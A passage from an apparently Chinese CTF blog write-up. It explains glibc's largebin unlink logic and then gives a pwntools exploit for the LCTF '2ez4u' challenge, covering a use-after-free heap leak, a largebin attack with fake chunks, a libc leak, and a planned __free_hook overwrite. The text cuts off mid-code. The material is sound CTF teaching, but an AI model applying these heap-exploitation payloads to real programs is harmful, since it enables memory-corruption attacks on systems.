  <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">	      malloc_printerr (check_action,				      \</span><br><span class="line">			       <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">			       P, AV);					      \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>魔改一下提高可读性</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line">unlink(AV, P, BK, FD) &#123;</span><br><span class="line">	FD = P-&gt;fd;</span><br><span class="line">	BK = P-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (FD-&gt;bk != P || BK-&gt;fd != P) &#123;</span><br><span class="line">		malloc_printerr(check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="comment">//普通unlink</span></span><br><span class="line">		FD-&gt;bk = BK;</span><br><span class="line">		BK-&gt;fd = FD;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//largebin的操作</span></span><br><span class="line">		<span class="keyword">if</span> (!in_smallbin_range(P-&gt;size)	&amp;&amp; P-&gt;fd_nextsize != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (P-&gt;fd_nextsize-&gt;bk_nextsize != P || P-&gt;bk_nextsize-&gt;fd_nextsize != P) &#123;</span><br><span class="line">				malloc_printerr(check_action, <span class="string">"corrupted double-linked list (not small)"</span>, P, AV);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (P-&gt;fd_nextsize == P) &#123;</span><br><span class="line">					FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;<span class="comment">//情况1</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					FD-&gt;fd_nextsize = P-&gt;fd_nextsize;<span class="comment">//情况2</span></span><br><span class="line">					FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">					P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">					P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<span class="comment">//情况3</span></span><br><span class="line">				P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>情况1:</strong></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P) &#123;</span><br><span class="line">		FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即只存在一组相同大小的chunk,要移除首chunk,如图</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_8e677b86fed88bb398543b8907263f20.png" alt=""></p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_cfee96c12a7576198a202af6ca81044f.png" alt=""></p>
+<p><strong>情况2:</strong></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (P-&gt;fd_nextsize == P) &#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    	FD-&gt;fd_nextsize = P-&gt;fd_nextsize;<span class="comment">//情况2</span></span><br><span class="line">    	FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">    	P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">    	P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即存在多组不同大小的chunk,移除某一大小的首chunk,如图</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_b57936a49048da31941105ca710a9bd0.png" alt=""></p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_5db3e53910e3e161a552faeec8614493.png" alt=""></p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_b507b3c5e7b90a45acd42d820a545887.png" alt=""></p>
+<p><strong>情况3:</strong></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;<span class="comment">//情况3</span></span><br><span class="line">	P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即存在多组不同大小的chunk,要移除的那个大小的那组chunk只有P一个,FD为另一个大小</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_d5bdb96af0e85d2ed72b839f01db4b2b.png" alt=""></p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_52a5a7acb152cce2837fff77f1ede86d.png" alt=""></p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_d4faeb7eb24f7b747e790a6d011fca60.png" alt=""></p>
+<hr>
+<p>一种可行的利用方法</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_1adcc332cf761488a7448bcbf8a457de.png" alt=""></p>
+<hr>
+<h2 id="LCTF-2ez4u"><a href="#LCTF-2ez4u" class="headerlink" title="LCTF - 2ez4u"></a>LCTF - 2ez4u</h2><p>题型是常规的选单题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">===== chall =====</span><br><span class="line">1. add apple</span><br><span class="line">2. del apple</span><br><span class="line">3. edit apple</span><br><span class="line">4. show apple</span><br><span class="line">5. quit</span><br><span class="line">your choice:</span><br></pre></td></tr></table></figure>
+<p>程序用到了两个结构体</p>
+<p>一个是list(chunklist),一个是apple(chunk)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00000000 apple           struc ; (sizeof=0x118, mappedto_6)</span><br><span class="line">00000000 color           dd ?</span><br><span class="line">00000004 num             dd ?</span><br><span class="line">00000008 value           dq ?</span><br><span class="line">00000010 idx             dd ?</span><br><span class="line">00000014 field_14        dd ?</span><br><span class="line">00000018 des             db 256 dup(?)</span><br><span class="line">00000118 apple           ends</span><br><span class="line">00000118</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 list            struc ; (sizeof=0x10, mappedto_7)</span><br><span class="line">00000000 inuse           dd ?</span><br><span class="line">00000004 len             dd ?</span><br><span class="line">00000008 obj             dq ?                    ; offset</span><br><span class="line">00000010 list            ends</span><br></pre></td></tr></table></figure>
+<p>其中最多能够分配16个apple</p>
+<p>程序的漏洞在于edit和show的时候没有检查obj的inuse,且delete的时候没有把指针清空,从而导致UAF</p>
+<p>还有几点需要注意的,<code>read_n</code>函数是一定会在末尾加0字节截断的,leak上可能没那么方便;apple结构体中看似color,num,value都能够修改,但这几个变量的值都是有限制的,因此最后下来只有在largebin搞事了(可能有其他未知的方法).</p>
+<p>说一下利用的思路</p>
+<p>首先因为有UAF,因此我们可以通过创建一个largebin,把他free掉,然后show的方法,leak出在description位置的<code>bk_nextsize</code>,从而得到heap地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">'./2ez4u'</span>)</span><br><span class="line">	<span class="comment">#bin = ELF('./2ez4u')</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(a=<span class="string">''</span>)</span>:</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(Len, con)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'0'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'0'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'0'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">	cn.sendline(str(Len))</span><br><span class="line">	cn.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">	cn.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, con)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line">	cn.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'1000'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'17'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">	cn.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	cn.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">	cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'2'</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>)</span><br><span class="line">add(<span class="number">0x3e0</span>,<span class="string">'5'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'7'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'8'</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">'9'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#备用</span></span><br><span class="line">dele(<span class="number">3</span>) <span class="comment">#largebin1(此时在unsorted)</span></span><br><span class="line">dele(<span class="number">5</span>) <span class="comment">#largebin2(此时在unsorted)</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'1'</span>) <span class="comment">#malloc_consoldate,把两个largebin放到largebin list中</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>) <span class="comment"># leak</span></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">heap = u64(cn.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x540</span></span><br><span class="line">success(<span class="string">'heap: '</span>+hex(heap))</span><br></pre></td></tr></table></figure>
+<p>但这样我们是得不到libc地址的,因此我们使用largebin attack</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x10 3 head</span></span><br><span class="line"><span class="string">0x400 3 malloc</span></span><br><span class="line"><span class="string">0x10 4 head</span></span><br><span class="line"><span class="string">0x90 4 malloc</span></span><br><span class="line"><span class="string">0x10 5 head</span></span><br><span class="line"><span class="string">0x3f0 5 malloc</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xb8 bk_nextsize</span></span><br><span class="line"><span class="comment">#0xc0 'a'*0x300</span></span><br><span class="line"><span class="comment">#0x3c0 p64()*4</span></span><br><span class="line"><span class="comment">#0x3e0 fake 1</span></span><br><span class="line">pay = p64(heap+<span class="number">0x3e0</span>)</span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x300</span> </span><br><span class="line">pay += p64(<span class="number">0xdeadbeef</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pay += p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(heap+<span class="number">0x3b0</span>)+p64(heap+<span class="number">0x3c0</span>)+p64(heap+<span class="number">0x90</span>)+p64(heap+<span class="number">0x570</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,pay)</span><br><span class="line"></span><br><span class="line">pay = p64(heap+<span class="number">0x90</span>)</span><br><span class="line"><span class="comment">#0x540</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x280</span>,<span class="string">'\x00'</span>)</span><br><span class="line">pay+=p64(<span class="number">0x410</span>)+p64(<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">5</span>,pay)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x410</span><span class="number">-0x20</span>,<span class="string">'QQQQQQQQ'</span>)<span class="comment">#0</span></span><br><span class="line"><span class="comment">#recover</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap+<span class="number">0x540</span>))</span><br><span class="line">add(<span class="number">0x410</span><span class="number">-0x20</span>,<span class="string">'X'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x20</span>,<span class="string">'Y'</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">7</span>)<span class="comment">#970</span></span><br><span class="line">dele(<span class="number">4</span>)<span class="comment">#4a0</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+<span class="string">'X'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'X'</span>*<span class="number">0x10</span>)</span><br><span class="line">main_arena=<span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(cn.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-main_arena<span class="number">-88</span></span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
+<p>解释一下,这里就是在使用上面所画的图的largebin attack,即图</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_1adcc332cf761488a7448bcbf8a457de.png" alt=""></p>
+<p>我们之前free的3号和5号chunk,chunk大小分别为0x410(3号)和0x400(5号),如图1</p>
+<p>接着我们通过修改UAF修改了3号的<code>bk_nextsize</code>,通过这两行代码造出了如图2的链<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pay = p64(heap+<span class="number">0x3e0</span>) <span class="comment">#bk_nextsize</span></span><br><span class="line">pay += <span class="string">'a'</span>*<span class="number">0x300</span> <span class="comment">#padding</span></span><br><span class="line"><span class="comment">#bypass fd,bk assert for unlink chunk A</span></span><br><span class="line">pay += p64(<span class="number">0xdeadbeef</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment">#fake chunk A (prev_size + size + fd + bk + fd_nextsize + bk_nextsize)</span></span><br><span class="line">pay += p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(heap+<span class="number">0x3b0</span>)+p64(heap+<span class="number">0x3c0</span>)+p64(heap+<span class="number">0x90</span>)+p64(heap+<span class="number">0x570</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,pay)</span><br><span class="line"></span><br><span class="line">pay = p64(heap+<span class="number">0x90</span>) <span class="comment">#untouched</span></span><br><span class="line"><span class="comment">#0x540</span></span><br><span class="line"><span class="comment"># fake chunk B (prev_size + size + fd + bk + fd_nextsize + bk_nextsize)</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(heap+<span class="number">0x3e0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x280</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment"># fake chunk A end</span></span><br><span class="line">pay+=p64(<span class="number">0x410</span>)+p64(<span class="number">0x410</span>)</span><br><span class="line">edit(<span class="number">5</span>,pay)</span><br></pre></td></tr></table></figure></p>
+<p>接着,只要分配的大小合适,系统就会去unlink fake chunk A.</p>
+<p>这里牵涉到malloc中largebin的分配原则,我们看一下源码</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/largebin_8025bba1cf199a063e59a0563c811f84.png" alt=""></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>) <span class="comment">#留空,防止idx 3,5 被覆盖</span></span><br><span class="line">add(<span class="number">0x410</span><span class="number">-0x20</span>,<span class="string">'QQQQQQQQ'</span>) <span class="comment">#0 get fake chunk A</span></span><br><span class="line"><span class="comment">#recover 否则后续的malloc会出错</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap+<span class="number">0x540</span>)) <span class="comment">#largebin的list恢复正常</span></span><br><span class="line">add(<span class="number">0x410</span><span class="number">-0x20</span>,<span class="string">'X'</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x400</span><span class="number">-0x20</span>,<span class="string">'Y'</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">7</span>) <span class="comment">#970 两个smallbin</span></span><br><span class="line">dele(<span class="number">4</span>) <span class="comment">#4a0</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'Q'</span>*(<span class="number">8</span>+<span class="number">0x90</span>)+<span class="string">'X'</span>*<span class="number">0x10</span>) <span class="comment">#想要去leak chunk 4 的fd,但read_n有0截断,此时无法leak</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'4'</span>) <span class="comment">#上面dele(7)的smallbin被取走,此时chunk4的fd和bk被重写,从而0截断消失</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak出chunk 4的fd</span></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">'X'</span>*<span class="number">0x10</span>)</span><br><span class="line">main_arena=<span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line">libc_base = u64(cn.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-main_arena<span class="number">-88</span></span><br><span class="line">success(<span class="string">'libc_base: '</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
+<p>现在libc的地址也拿到了,我们考虑通过fastbin attack去改arena的top到freehook上方,然后不断malloc从而写system到freehook</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td 